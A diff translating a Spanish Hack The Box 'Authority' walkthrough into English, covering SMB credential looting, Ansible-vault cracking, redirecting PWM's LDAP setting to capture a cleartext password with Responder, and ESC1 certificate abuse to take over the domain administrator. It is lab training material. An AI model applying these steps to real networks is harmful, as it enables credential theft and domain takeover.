@@ -2,7 +2,7 @@
 
 # Enumeration
 
->Comenzamos con un escaneo de puertos empleando el script de escaneo automático de puertos TCP creado por mí:
+>We started with a port scan using the automatic TCP port scanning script created by me:
 
 ```bash
 ┌──(kali㉿jbkira)-[~]
@@ -114,7 +114,7 @@ Puertos TCP abiertos:
 |_    Message signing enabled and required
 ```
 
-> Vamos a enumerar la versión de Windows y el dominio de Active Directory empleando crackmapexec:
+> Let's list the Windows version and Active Directory domain using crackmapexec:
 
 ```bash
 ┌──(kali㉿jbkira)-[~]
@@ -122,16 +122,16 @@ Puertos TCP abiertos:
 SMB         10.129.213.10   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
 ```
 
-> Vamos a agregar el dominio a nuestro resolutor local (/etc/hosts) para que pueda resolver el nombre de dominio:
+> Let's add the domain to our local resolver (/etc/hosts) so it can resolve the domain name:
 
 ```bash
 ┌──(kali㉿jbkira)-[~]
 └─$ echo "10.129.213.10 authority.authority.htb authority.htb" >> /etc/hosts
 ```
 
->Si entramos al sitio web alojado en el puerto 8443 vemos un Password Self Service
+>If we enter the website hosted on port 8443 we see a Password Self Service
 
->Vamos a listar los shares al usuario anónimo, aquí podemos ver que hay uno interesante llamado Development:
+>Let's list the shares to the anonymous user, here we can see that there is an interesting one called Development:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/authority]
@@ -149,7 +149,7 @@ Password for [WORKGROUP\]:
         SYSVOL          Disk      Logon server share
 ```
 
->Nos descargamos el contenido del share para poder enumerarlo mejor:
+>We downloaded the content of the share to be able to list it better:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/authority]
@@ -168,7 +168,7 @@ smb: \> prompt OFF
 smb: \> mget *
 ```
 
->En un archivo encontramos credenciales de tomcat:
+>In a file we found tomcat credentials:
 >`tomcat:T0mc@tAdm1n` `robot:T0mc@tR00t`
 
 ```bash
@@ -186,7 +186,7 @@ smb: \> mget *
 </tomcat-users>
 ```
 
->Vemos otro archivo con credenciales:
+>We see another file with credentials:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/…/authority/Automation/Ansible/PWM]
@@ -199,7 +199,7 @@ ansible_winrm_transport: ntlm
 ansible_winrm_server_cert_validation: ignore
 ```
 
->Y otro con credenciales encriptadas:
+>And another with encrypted credentials:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/…/authority/Automation/Ansible/PWM]
@@ -241,7 +241,7 @@ ldap_admin_password: !vault |
           3764
 ```
 
->Vamos a tomar los hashes y prepararlos con ansible2john para poder crackearlos:
+>Let's take the hashes and prepare them with ansible2john so we can crack them:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/…/authority/Automation/Ansible/PWM]
@@ -257,7 +257,7 @@ pwm_admin_pwd:$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827b
 pwm_admin_login:$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8
 ```
 
->Vemos que son crackeables:
+>We see that they are crackable:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/…/authority/Automation/Ansible/PWM]
@@ -275,7 +275,7 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ```
 
->Vamos a emplear ansible-vault para obtener el valor real de cada hash:
+>Let's use ansible-vault to get the real value of each hash:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/…/authority/Automation/Ansible/PWM]
@@ -294,7 +294,7 @@ Vault password:
 Decryption successful
 ```
 
->Con esto conseguimos dos credenciales: `svc_pwm:pWm_@dm!N_!23` y `svc_ldap:DevT3st@123`
+>With this we get two credentials: `svc_pwm:pWm_@dm!N_!23` and `svc_ldap:DevT3st@123`
 
 ```bash
 ┌──(kali㉿jbkira)-[~/…/authority/Automation/Ansible/PWM]
@@ -308,7 +308,7 @@ pWm_@dm!N_!23
 DevT3st@123
 ```
 
->Vamos a probarlas con crackmapexec:
+>Let's try them with crackmapexec:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/…/authority/Automation/Ansible/PWM]
@@ -322,11 +322,11 @@ SMB         10.129.213.10   445    AUTHORITY        [*] Windows 10 / Server 2019
 SMB         10.129.213.10   445    AUTHORITY        [+] authority.htb\svc_pwm:pWm_@dm!N_!23
 ```
 
->Si accedemos al Configuration Manager del PWM vemos que nos pide una contraseña, la cual es la que obtuvimos previamente:
+>If we access the Configuration Manager of the PWM we see that it asks us for a password, which is the one we previously obtained:
 
 ![image](https://github.com/user-attachments/assets/f0739f91-8025-47ff-b602-caa2115f1a6c)
 
->Teniendo acceso a editar la configuración vamos a intentar realizar un ataque para obtener la contraseña en texto plano del usuario que está configurado para acceder al servidor LDAP al cambiar el servidor LDAP al que apunta a nuestra máquina atacante:
+>Having access to edit the configuration we will try to perform an attack to obtain the password in plain text of the user who is configured to access the LDAP server when changing the LDAP server to which it points to our attacking machine:
 
 ![image](https://github.com/user-attachments/assets/53a5ee96-9696-411f-8720-ec719c80eed3)
 
@@ -336,7 +336,7 @@ SMB         10.129.213.10   445    AUTHORITY        [+] authority.htb\svc_pwm:pW
 ldap://10.10.14.157:389
 ```
 
->Iniciamos responder para interceptar la autenticación y al darle a comprobar perfil obtenemos credenciales en texto plano: `svc_ldap:lDaP_1n_th3_cle4r!`
+>We start `responder` to intercept the authentication and by checking profile we obtain credentials in plain text:`svc_ldap:lDaP_1n_th3_cle4r!`
 
 ```bash
 ┌──(kali㉿jbkira)-[~/…/authority/Automation/Ansible/PWM]
@@ -365,7 +365,7 @@ ldap://10.10.14.157:389
 [LDAP] Cleartext Password : lDaP_1n_th3_cle4r!
 ```
 
->Vamos a probarlas con crackmapexec:
+>Let's try them with crackmapexec:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/…/authority/Automation/Ansible/PWM]
@@ -374,7 +374,7 @@ SMB         10.129.213.10   445    AUTHORITY        [*] Windows 10 / Server 2019
 SMB         10.129.213.10   445    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r!
 ```
 
->Vamos a obtener mediante el collector bloodhound-python archivos bloodhound para analizar posibles vectores de ataque para escalar privilegios en el dominio:
+> Using the bloodhound-python collector, we are going to obtain bloodhound files to analyze possible attack vectors to escalate privileges in the domain:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/…/authority/Automation/Ansible/PWM]
@@ -402,14 +402,14 @@ INFO: Querying computer: authority.authority.htb
 INFO: Done in 00M 13S
 ```
 
->Abrimos bloodhound e inicializamos el servicio neo4j, importando los archivos resultantes:
+>We open bloodhound and initialize the neo4j service, importing the resulting files:
 
 ```bash
 sudo neo4j start
 bloodhound &>/dev/null & disown
 ```
 
->Vemos que el usuario pertenece al grupo Remote Management Users que podemos explotar para obtener una shell como dicho usuario en el DC, donde podemos ver la flag user.txt:
+>We see that the user belongs to the Remote Management Users group that we can exploit to obtain a shell as said user in the DC, where we can see the user.txt flag:
 
 ![image](https://github.com/user-attachments/assets/c346df2b-3611-4623-b1f1-aa682db81be7)
 
@@ -432,7 +432,7 @@ Mode                LastWriteTime         Length Name
 
 # Privilege Escalation
 
->Vamos a buscar si hay vulnerabilidades en el AD CS:
+>Let's look for vulnerabilities in the AD CS:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/authority]
@@ -454,7 +454,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Saved JSON output to '20250425161546_Certipy.json'
 ```
 
->Por lo que podemos ver si la hay, en concreto, deberemos explotar un ECS1:
+>So we can see if there is, in particular, we will have to exploit an ECS1:
 
 ```JSON
 "[!] Vulnerabilities": {
@@ -462,7 +462,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 }
 ```
 
->Datos importantes obtenidos del archivo resultante para realizar la explotación:
+> Important data obtained from the resulting file to perform the exploitation:
 
 ```JSON
 "CA Name": "AUTHORITY-CA"
@@ -476,9 +476,9 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
         }
 ```
 
-> Aprovecharemos esta vulnerabilidad para escalar privilegios pidiendo un certificado pfx del usuario administrador para así poder impersonarlo y ganar acceso a este.
+> We will take advantage of this vulnerability to escalate privileges by requesting a pfx certificate from the administrator user in order to impersonate it and gain access to it.
 
-> Para ello, debemos obtener acceso a una cuenta de alguno de los grupos listados anteriormente, por suerte, nuestro usuario tiene los privilegios SeMachineAccountPrivilege 
+> To do this, we must obtain access to an account of one of the groups listed above, luckily, our user has the SeMachineAccountPrivilege privileges
 
 ```powershell
 *Evil-WinRM* PS C:\Users\svc_ldap\Documents> whoami /priv
@@ -493,7 +493,7 @@ SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 ```
 
->Estos privilegios nos permiten añadir computer accounts al dominio, lo aprovecharemos con la siguiente utilidad de impacket:
+>These privileges allow us to add computer accounts to the domain, we will use it with the following impacket utility:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/authority]
@@ -503,7 +503,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*] Successfully added machine account jbkira$ with password Password123.
 ```
 
->Ahora vamos a pedir el certificado .pfx del administrador aprovechando la template vulnerable ahora que tenemos una cuenta del grupo Domain Computers:
+>Now let's ask for the administrator's .pfx certificate by leveraging the vulnerable template now that we have a Domain Computers group account:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/authority]
@@ -523,7 +523,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Saved certificate and private key to 'administrator.pfx'
 ```
 
->Vamos a obtener del certificado un archivo .crt y otro .key
+>Let's get a .crt file and a .key file from the certificate
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/authority]
@@ -539,9 +539,9 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Writing private key to 'user.key'
 ```
 
->Ahora vamos a emplear la siguiente herramienta para logguearnos como el usuario administrador empleando el certificado: https://raw.githubusercontent.com/AlmondOffSec/PassTheCert/refs/heads/main/Python/passthecert.py
+>Now we are going to use the following tool to log in as the administrator user using the certificate: https://raw.githubusercontent.com/AlmondOffSec/PassTheCert/refs/heads/main/Python/passthecert.py
 
->Aprovecharemos esta herramienta para cambiarle la contraseña al usuario administrador:
+>We will use this tool to change the password of the administrator user:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/authority]
@@ -552,7 +552,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
 ```
 
->Ahora nos logueamos con las credenciales nuevas desde Evil-WinRM, donde podemos ver la flag root.txt:
+>Now we log in with the new credentials from Evil-WinRM, where we can see the flag root.txt:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/authority]
